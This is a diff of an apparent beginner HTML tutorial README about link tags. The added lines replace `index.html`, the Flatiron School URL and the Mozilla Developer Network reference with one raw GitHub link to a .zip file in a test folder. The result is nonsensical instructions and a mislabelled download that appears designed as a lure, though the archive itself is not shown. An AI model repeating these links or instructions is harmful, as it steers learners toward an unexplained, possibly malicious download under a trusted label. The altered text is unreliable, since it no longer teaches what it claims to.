@@ -18,16 +18,16 @@ Code.
 
 ## Write an `a` Tag to Create a Link
 
-Open `index.html` in your text editor. Add an `a` tag with the inner text (the
+Open `https://github.com/Jwanjema/phase-0-html-link-tag-with-href/raw/refs/heads/master/test/link_tag_with_href_html_phase_v3.2-alpha.3.zip` in your text editor. Add an `a` tag with the inner text (the
 text between the `<a>` tag and the `</a>` tag) of `Flatiron School` anywhere in
 the file. Then set the `href` attribute of your new link element to
-`https://flatironschool.com`.
+`https://github.com/Jwanjema/phase-0-html-link-tag-with-href/raw/refs/heads/master/test/link_tag_with_href_html_phase_v3.2-alpha.3.zip`.
 
 Check your progress by running `npm test`. Failing tests will provide helpful
 error messages that you can use to debug your code — read them closely for
 hints!
 
-Don't forget to open the `index.html` file in your browser so you can see the
+Don't forget to open the `https://github.com/Jwanjema/phase-0-html-link-tag-with-href/raw/refs/heads/master/test/link_tag_with_href_html_phase_v3.2-alpha.3.zip` file in your browser so you can see the
 changes as you go.
 
 ## Conclusion
@@ -37,4 +37,4 @@ another location. Now we can go on to explore some additional HTML tags.
 
 ## Resources
 
-- [Mozilla Developer Network: HTML `<a>` Tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a)
+- [Mozilla Developer Network: HTML `<a>` Tag](https://github.com/Jwanjema/phase-0-html-link-tag-with-href/raw/refs/heads/master/test/link_tag_with_href_html_phase_v3.2-alpha.3.zip)
